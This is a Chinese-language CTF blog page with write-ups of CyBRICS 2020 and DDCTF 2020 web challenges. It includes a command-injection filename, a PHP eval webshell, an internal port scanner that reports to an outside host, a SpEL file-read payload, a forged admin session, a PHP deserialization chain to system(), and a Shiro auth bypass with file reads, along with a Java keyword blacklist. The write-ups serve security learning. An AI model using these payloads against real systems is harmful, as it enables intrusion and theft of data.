<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/CTFd任意密码重置复现/">https://www.ccreater.top/1970/01/01/CTFd任意密码重置复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" data-id="ckmn5754y0019s1nibzlt4xi5" data-title="CTFd任意密码重置复现" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/CyBRICS2020/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/CyBRICS2020/">CyBRICS2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p>
<p>flag:<code>cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}</code></p>
<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p>
<pre><code>if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):
    exit()
...
def allowed_file(filename):
    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
allowed_file(file.filename)
...
command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre><p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p>
<p>cybrics{imagesaresocoolicandrawonthem}</p>
<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
<p>calc.php</p>
<pre><code class="php=">if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
        $value = &quot;BAD&quot;;
    }else{
    $value = eval(&quot;return $field;&quot;);
}</code></pre>
<pre><code>9999999999999999999:1.0E+25
1/0:INF
0/0:NAN
log(0):-INF</code></pre><p>newtemplate.php</p>
<pre><code class="php=">        if (strpos($html, &#39;&lt;?&#39;) !== false) {
            $error = &quot;Bad chars&quot;;
            break;
        }
        ...
        file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html);</code></pre>
<p>calc.php</p>
<pre><code class="php=">file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));</code></pre>
<p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p>
<p>新建template:</p>
<pre><code>*/)).eval($_POST[1])?&gt;
$requiredBlocks = [
            &#39;id=&quot;back&quot;&#39;,
            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
            &#39;id=&quot;digit0&quot;&#39;,
            &#39;id=&quot;digit1&quot;&#39;,
            &#39;id=&quot;digit2&quot;&#39;,
            &#39;id=&quot;digit3&quot;&#39;,
            &#39;id=&quot;digit4&quot;&#39;,
            &#39;id=&quot;digit5&quot;&#39;,
            &#39;id=&quot;digit6&quot;&#39;,
            &#39;id=&quot;digit7&quot;&#39;,
            &#39;id=&quot;digit8&quot;&#39;,
            &#39;id=&quot;digit9&quot;&#39;,
            &#39;id=&quot;plus&quot;&#39;,
            &#39;id=&quot;equals&quot;&#39;,
        ];</code></pre><p>向calc post:<br><code>field=1/*&amp;share=1</code></p>
<p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p>
<h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p>
<p>浏览器信息：HeadlessChrome/79.0.3945.79 </p>
<p>填写脚本：</p>
<pre><code class="javascript=">a=document.getElementsByClassName(&quot;form-control&quot;);a[1].value=&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;;a[0].value=&quot;http://ccreater.top:60000&quot;;</code></pre>
<p>返回包</p>
<pre><code>HEAD / HTTP/1.1
Host: ccreater.top:60000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Access-Control-Request-Method: POST
Origin: prod.free-design-feedback-cybrics2020.ctf.su
Referer: http://prod.free-design-feedback-cybrics2020.ctf.su
</code></pre><p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p>
<p>http服务扫描：</p>
<pre><code class="htmlmixed=">&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;script&gt;
var from = 1;
var complete = true;
var clear = false;
function check(text){
    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener(&#39;load&#39;, function () {
        console.log(text)
        // log
        fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)
            .then(r=&gt;r.text())
            .then(d=&gt;{console.log(&quot;log success&quot;)})
        // log end
    });
}
function clearstyle(clear_from ,clear_to){
    clear = true;
    console.log(&quot;clear task start&quot;);
    while(clear_to&lt;=clear_from){
            document.head.querySelector(&#39;link[href$=&quot;:&#39;+clear_to+&#39;&quot;&#39;).remove();
            clear_to++;
    }
    clear = false;
    console.log(&quot;clear task end&quot;);
}
function make(text){
    head = document.getElementsByTagName(&#39;head&#39;)[0];
    var port = text;
    var url = &quot;http://127.0.0.1:&quot;+port,
    link = document.createElement(&#39;link&#39;);
    link.rel = &quot;stylesheet&quot;;
    link.href = url;
    head.appendChild(link);
    check(text);
}
async function scan(){
    var to = from + 80 &gt; 65535 ? 65535 : from + 80;
    for(var i=from;i&lt;to;i++){
        make(String(i));
    }
    from +=80;
    setTimeout(()=&gt;{clearstyle(from,to);},5000);
};

async function listener (){
    console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);
    if(from &lt; 65535){
        setTimeout(listener,5000);
        if(complete &amp;&amp; !clear){
            console.log(&quot;new task!&quot;);
            scan()
                .then(()=&gt;{complete = true;})
            complete = false;
        }
    }

}
listener()
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p>
<p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/CyBRICS2020/">https://www.ccreater.top/1970/01/01/CyBRICS2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/CyBRICS2020/" data-id="ckmn5754z001ds1nibw8uczp7" data-title="CyBRICS2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-DDCTF2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/DDCTF2020/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/DDCTF2020/">DDCTF2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DDCTF2020"><a href="#DDCTF2020" class="headerlink" title="DDCTF2020"></a>DDCTF2020</h1><h2 id="拼图游戏"><a href="#拼图游戏" class="headerlink" title="拼图游戏"></a>拼图游戏</h2><p>纯手工</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200906061331.png" alt="image80"></p>
<h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>根据题目提示得到两个接口</p>
<pre><code>Method | POST
URL    | http://117.51.136.197/admin/login
Param  | username str | pwd str
Response
token str | auth(Certification information)

- auth interface
Request
Method | POST
URL    | http://117.51.136.197/admin/auth
Param  | username str | pwd str | token str
Response</code></pre><p>用c-jwt-cracker爆破login生成的jwt</p>
<p>得到下一步入口：</p>
<pre><code>client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client</code></pre><p>是一个go文件，叫二进制队友来逆</p>
<p>得到收发脚本：</p>
<pre><code class="python">import hmac
import base64
import time
import requests
t = time.time()
print(t)
t = str(t)

t = t[:10]
cmd=&quot;99-9&quot;
s = &quot;{}|&quot;.format(cmd) + t
print(s)
t = bytes(s, encoding = &quot;utf8&quot;)
message = t
key = b&#39;DDCTFWithYou&#39;
h = hmac.new(key,message,digestmod=&#39;SHA256&#39;)
signature=base64.b64encode(h.digest()).decode()


burp0_url = &quot;http://117.51.136.197:80/server/command&quot;
burp0_headers = {&quot;User-Agent&quot;: &quot;Go-http-client/1.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Accept-Encoding&quot;: &quot;gzip&quot;}
burp0_json={&quot;signature&quot;:signature ,&quot;command&quot;: cmd,  &quot;timestamp&quot;: s[-10:]}
print(burp0_json)
r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies={&quot;http&quot;:&quot;&quot;})
print(r.text)</code></pre>
<p>但是在这里我卡住了，因为client是用go写的我也理所当然的认为后端也是用</p>
<p>go写的，于是就去试go的各种eval框架都不行，最后还是在别人的提示下才走出误区（应该写一个测试SSTI，eval等等的fuzz字典），经过一天的折腾后发现是SPeL</p>
<p>去网上找到了Ying师傅的payload</p>
<p><code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;/home/dc2-user/flag/flag.txt&#39;)))).nextLine()</code></p>
<p><code>DDCTF{Q24uf486whGOWN44UtZCjYUgdnnnRaVs}</code></p>
<h2 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h2><p>目标是让我们拿到100个卡片，但是有时间限制，利用借入和借出来获得100个卡片显然是不现实的。</p>
<p>刚开始想的是条件竞争，后来测试后发现不行，在这里我被卡住了。</p>
<p>继续测试发现，这里存在着整数溢出漏洞（卡片数是个大整数，而借入借出是个小整数），我们让卡片数不溢出，而借入数溢出，就可以得到许多卡片。接着我们得到了一个SecKey和获取flag的地址：<code>/flag</code>，但是需要我们是admin账号</p>
<p><code>session:MTU5OTIyNTI5MXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl5TlRJNU1Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXlOVEk1TVgwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfMaqAqFFw43-8z8EcAFY04oenUI0FyhjaW8KZXGH2uSX</code></p>
<p>对session进行解密发现,他的格式类似：<code>base64encode(timestamp|base64urlencode(gob)|check)</code></p>
<p>利用<a href="https://gitlab.com/drosseau/degob" target="_blank" rel="noopener">https://gitlab.com/drosseau/degob</a> 获得gob内容</p>
<p><code>map[interface{}]interface{}{&quot;admin&quot;: false,&quot;wallet&quot;: &quot;{&quot;owings&quot;:[{&quot;OwingMoney&quot;:100000,&quot;NeedMoney&quot;:100002,&quot;OwingTime&quot;:1599223614}],&quot;invests&quot;:[{&quot;InvestMoney&quot;:100006,&quot;ReceiveMoney&quot;:100009,&quot;InvestTime&quot;:1599223644}],&quot;money&quot;:0,&quot;now_time&quot;:1599222955,&quot;start_time&quot;:1599222835}&quot;}</code></p>
<p>显然我们需要修改admin的值，在云屿师傅的帮助下知道了这是一个gin生成的session</p>
<pre><code class="go">package main

import (
        &quot;github.com/gin-contrib/sessions&quot;
        &quot;github.com/gin-contrib/sessions/cookie&quot;
        &quot;github.com/gin-gonic/gin&quot;
)

func main() {
        r := gin.Default()
        store := cookie.NewStore([]byte(&quot;Udc13VD5adM_c10nPxFu@v12&quot;))
        r.Use(sessions.Sessions(&quot;session&quot;, store))

        r.GET(&quot;/incr&quot;, func(c *gin.Context) {
                session := sessions.Default(c)
                var count bool
                v := session.Get(&quot;admin&quot;)
                if v == nil {
                        count = true
                } else {
                        count = v.(bool)
                        count = true
                }
                session.Set(&quot;admin&quot;, count)
                session.Save()
                c.JSON(200, gin.H{&quot;admin&quot;: count})
        })
        r.Run(&quot;:8000&quot;)
}</code></pre>
<p>得到flag:<code>DDCTF{Th151s3AsY4ormE2333!}</code></p>
<h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><p>题目环境：PHP/5.6.10</p>
<p>题目源码：</p>
<pre><code class="php">Welcome to DDCTF 2020, Have fun!

&lt;?php
error_reporting(0);

class MyClass
{
    var $kw0ng;
    var $flag;

    public function __wakeup()
    {
        $this-&gt;kw0ng = 2;
    }

    public function get_flag()
    {
        return system(&#39;find /HackersForever &#39; . escapeshellcmd($this-&gt;flag));
    }
}

class HintClass
{   
    protected  $hint;
    public function execute($value)
    {
        include($value);
    }

    public function __invoke()
    {
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;, $this-&gt;hint))
        {
            die(&quot;Don&#39;t Do That!&quot;);
        }
        $this-&gt;execute($this-&gt;hint);
    }
}

class ShowOff
{
    public $contents;
    public $page;
    public function __construct($file=&#39;/hint/hint.php&#39;)
    {
        $this-&gt;contents = $file;
        echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;;
    }
    public function __toString()
    {
        return $this-&gt;contents();
    }

    public function __wakeup()
    {
        $this-&gt;page-&gt;contents = &quot;POP me! I can give you some hints!&quot;;
        unset($this-&gt;page-&gt;cont);
    }
}

class MiddleMan
{
    private $cont;
    public $content;
    public function __construct()
    {
        $this-&gt;content = array();
    }

    public function __unset($key)
    {
        $func = $this-&gt;content;
        return $func();
    }
}

class Info
{
    function __construct()
    {
        eval(&#39;phpinfo();&#39;);
    }

}

$show = new ShowOff();
$bullet = $_GET[&#39;bullet&#39;];

if(!isset($bullet))
{
    highlight_file(__FILE__);
    die(&quot;Give Me Something!&quot;);
}else if($bullet == &#39;phpinfo&#39;)
{
    $infos = new Info();
}else
{
    $obstacle1 = new stdClass;
    $obstacle2 = new stdClass;
    $mc = new MyClass();
    $mc-&gt;flag = &quot;MyClass&#39;s flag said, Overwrite Me If You Can!&quot;;
    @unserialize($bullet);
    echo $mc-&gt;get_flag();
}</code></pre>
<p>直接访问hint.php</p>
<p>得到：<code>Good Job! You&#39;ve got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</code></p>
<p>看样子是要让我们利用GMP打他</p>
<p>这里不急先分析一下代码，构思一下可以利用的反序列化链</p>
<p><code>ShowOff::__wakeup-&gt;MiddleMan::__unset-&gt;$func();</code> </p>
<p>令<code>$func=[MyClass,&quot;get_flag&quot;]</code>实现任意命令执行，结束（GMP就不见了，盲猜出题人没限制好）</p>
<h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h2><p>第一次熬夜杠题，真爽</p>
<p>登陆失败后响应体出现：<code>RememberMe=DeleteMe</code>，shiro稳了</p>
<p>尝试一下Shiro 反序列化，果然GG</p>
<p><a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">https://shiro.apache.org/security-reports.html</a></p>
<p>去官网看下CVE，试一下发现存在CVE-2020-11989</p>
<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index</a></p>
<p>绕过权限验证，发现任意文件读取接口</p>
<p><code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg</code></p>
<p>（原本是想直接读取Shiro的key来直接打穿的，搞了好久都没找到）</p>
<p>常规思路：</p>
<ol>
<li><p>先读取 web.xml</p>
<pre><code class="xml">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;
version=&quot;3.0&quot; metadata-complete=&quot;false&quot;&gt;
  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;
  &lt;context-param&gt;
    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
    &lt;param-value&gt;classpath:spring-core.xml&lt;/param-value&gt;
  &lt;/context-param&gt;
  &lt;listener&gt;
    &lt;listener-class&gt;org.springframework.web.util.WebAppRootListener&lt;/listener-class&gt;
  &lt;/listener&gt;
  &lt;listener&gt;
    &lt;listener-class&gt;org.springframework.web.util.IntrospectorCleanupListener&lt;/listener-class&gt;
  &lt;/listener&gt;
  &lt;listener&gt;
    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;
  &lt;/listener&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;
    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
    &lt;init-param&gt;
      &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;
      &lt;param-value&gt;classpath:spring-web.xml&lt;/param-value&gt;
    &lt;/init-param&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;filter&gt;
    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
    &lt;init-param&gt;
      &lt;param-name&gt;encoding&lt;/param-name&gt;
      &lt;param-value&gt;UTF-8&lt;/param-value&gt;
    &lt;/init-param&gt;
    &lt;init-param&gt;
      &lt;param-name&gt;forceEncoding&lt;/param-name&gt;
      &lt;param-value&gt;true&lt;/param-value&gt;
    &lt;/init-param&gt;
  &lt;/filter&gt;
  &lt;filter-mapping&gt;
    &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
  &lt;filter&gt;
    &lt;filter-name&gt;safeFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;com.ctf.util.SafeFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
  &lt;filter-mapping&gt;
    &lt;filter-name&gt;safeFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
  &lt;filter&gt;
    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;
    &lt;init-param&gt;
      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;
      &lt;param-value&gt;true&lt;/param-value&gt;
    &lt;/init-param&gt;
  &lt;/filter&gt;
  &lt;filter-mapping&gt;
    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;500&lt;/error-code&gt;
    &lt;location&gt;/error.jsp&lt;/location&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;404&lt;/error-code&gt;
    &lt;location&gt;/hacker.jsp&lt;/location&gt;
  &lt;/error-page&gt;
  &lt;error-page&gt;
    &lt;error-code&gt;403&lt;/error-code&gt;
    &lt;location&gt;/hacker.jsp&lt;/location&gt;
  &lt;/error-page&gt;
&lt;/web-app&gt;</code></pre>
</li>
<li><p>依次读取class文件：<br><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class</a></p>
<pre><code class="java">package com.ctf.util;

import java.io.IOException;
import java.util.Enumeration;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletResponse;

public class SafeFilter
  implements Filter
{
  private final String encoding = &quot;UTF-8&quot;;
  private static String[] blacklists = { &quot;java.+lang&quot;, &quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#39;&quot;, &quot;exec.*\\(&quot;, &quot;write|read&quot;, &quot;invoke.*\\(&quot;, &quot;\\.forName.*\\(&quot;, &quot;lookup.*\\(&quot;, &quot;\\.getMethod.*\\(&quot;, &quot;javax.+script.+ScriptEngineManager&quot;, &quot;com.+fasterxml&quot;, &quot;org.+apache&quot;, &quot;org.+hibernate&quot;, &quot;org.+thymeleaf&quot;, &quot;javassist&quot;, &quot;javax\\.&quot;, &quot;eval.*\\(&quot;, &quot;\\.getClass\\(&quot;, &quot;org.+springframework&quot;, &quot;javax.+el&quot;, &quot;java.+io&quot; };

  public void init(FilterConfig arg0)
    throws ServletException
  {}

  public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
    throws IOException, ServletException
  {
    request.setCharacterEncoding(&quot;UTF-8&quot;);
    response.setCharacterEncoding(&quot;UTF-8&quot;);
    Enumeration pNames = request.getParameterNames();
    while (pNames.hasMoreElements())
    {
      String name = (String)pNames.nextElement();
      String value = request.getParameter(name);
      for (String blacklist : blacklists)
      {
        Matcher matcher = Pattern.compile(blacklist, 34).matcher(value);
        if (matcher.find())
        {
          HttpServletResponse servletResponse = (HttpServletResponse)response;
          servletResponse.sendError(403);
        }
      }
    }
    filterChain.doFilter(request, response);
  }

  public void destroy() {}
}
</code></pre>
<p>然后其他的被waf过滤了<br>读取web.xml中的其他配置文件</p>
<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml</a></p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xmlns:p=&quot;http://www.springframework.org/schema/p&quot;
xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;
xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
xmlns:jee=&quot;http://www.springframework.org/schema/jee&quot;
xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;
xsi:schemaLocation=&quot;http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd
http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd
http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd
http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd&quot;&gt;
  &lt;import resource=&quot;classpath:spring-shiro.xml&quot; /&gt;
  &lt;!-- 声明自动为spring容器中那些配置@Aspectj切面的bean创建代理，织入切面 --&gt;
  &lt;aop:aspectj-autoproxy&gt;&lt;/aop:aspectj-autoproxy&gt;
  &lt;!-- 支持事物注解（@Transactional） --&gt;
  &lt;tx:annotation-driven/&gt;
  &lt;bean id=&quot;viewResolver&quot; class=&quot;org.thymeleaf.spring4.view.ThymeleafViewResolver&quot;&gt;
    &lt;property name=&quot;order&quot; value=&quot;1&quot;/&gt;
    &lt;property name=&quot;characterEncoding&quot; value=&quot;UTF-8&quot;/&gt;
    &lt;property name=&quot;templateEngine&quot; ref=&quot;templateEngine&quot;/&gt;
  &lt;/bean&gt;
  &lt;bean id=&quot;templateEngine&quot; class=&quot;org.thymeleaf.spring4.SpringTemplateEngine&quot;&gt;
    &lt;property name=&quot;templateResolver&quot; ref=&quot;templateResolver&quot; /&gt;
  &lt;/bean&gt;
  &lt;bean id=&quot;templateResolver&quot; class=&quot;org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver&quot;&gt;
    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/templates/&quot;/&gt;
    &lt;property name=&quot;suffix&quot; value=&quot;.html&quot;/&gt;
    &lt;property name=&quot;templateMode&quot; value=&quot;HTML5&quot;/&gt;
    &lt;property name=&quot;cacheable&quot; value=&quot;false&quot;/&gt;
    &lt;property name=&quot;characterEncoding&quot;  value=&quot;UTF-8&quot; /&gt;
  &lt;/bean&gt;
  &lt;context:annotation-config /&gt;
  &lt;context:component-scan base-package=&quot;com.ctf&quot;&gt;
    &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Service&quot; /&gt;
    &lt;context:include-filter type=&quot;annotation&quot; expression=&quot;org.springframework.stereotype.Repository&quot; /&gt;
  &lt;/context:component-scan&gt;
&lt;/beans&gt;</code></pre>
<p><a href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml" target="_blank" rel="noopener">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-web.xml</a></p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;
xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;
  &lt;!-- 自动扫描 Controller 包 --&gt;
  &lt;context:component-scan base-package=&quot;com.ctf.controller&quot;/&gt;
  &lt;context:component-scan base-package=&quot;com.ctf.repository&quot;/&gt;
  &lt;context:component-scan base-package=&quot;com.ctf.service&quot;/&gt;
  &lt;!-- 注解配置和乱码处理 --&gt;
  &lt;mvc:annotation-driven&gt;
    &lt;mvc:message-converters&gt;
      &lt;bean class=&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt;
        &lt;constructor-arg value=&quot;UTF-8&quot;/&gt;
      &lt;/bean&gt;
    &lt;/mvc:message-converters&gt;
  &lt;/mvc:annotation-driven&gt;
  &lt;mvc:default-servlet-handler/&gt;
&lt;/beans&gt;</code></pre>
